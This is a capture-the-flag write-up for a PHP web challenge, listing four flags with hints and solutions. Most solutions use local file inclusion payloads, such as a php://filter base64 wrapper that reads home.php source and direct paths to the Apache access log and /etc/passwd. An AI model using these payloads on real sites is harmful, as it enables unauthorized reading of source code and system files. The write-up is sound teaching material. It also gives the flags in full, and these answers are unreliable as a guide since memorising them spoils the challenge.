# Writeup

## Flag 1
In `home.php`(HTML): `FLAG-Th15_I5_W4y_To0_E45y`

Hint: `Use the source Luke!`

Solution: Open the source using your favorite browser.

## Flag 2
In `home.php`(PHP): `FLAG-LFI_L3t_Y0u_D0_W4y_M0r3_Th4n_Th47!`

Hint: `At the URL, you will look closely.`

Solution:
- Use the lfi to get the home page PHP code using filters.
```
/?page=php://filter/convert.base64-encode/resource=home.php
```
- The code is base64 encoded so, decode it using CyberChef, Python, base64, etc...
```
$ echo "<BASE64_CODE_HERE>" | base64 -d -
```

## Flag 3
In `/var/log/apache2/access.log`: `FLAG-A7_L3457_Y0u_D0n7_S33_U53r5`

Hint: `Even web servers have things to write about...`

Solution:
- Use the lfi to get the apache access logs.
```
/?page=/var/log/apache2/access.log
```
- The flag is rot13 encoded so, decode it using CyberChef, Python, etc...

## Flag 4
In `/etc/passwd`: `FLAG-Ok_Th47_W45_Th3_L457_On3`

Hint: None

Solution: Use the lfi to access the `/etc/passwd` file. (There is an opening php tag in the file, so you need to convert to base64 using filters again :P)
```
/?page=php://filter/convert.base64-encode/resource=/etc/passwd
```
- The flag is base32 + morse encoded so, decode it using CyberChef, Python, etc...
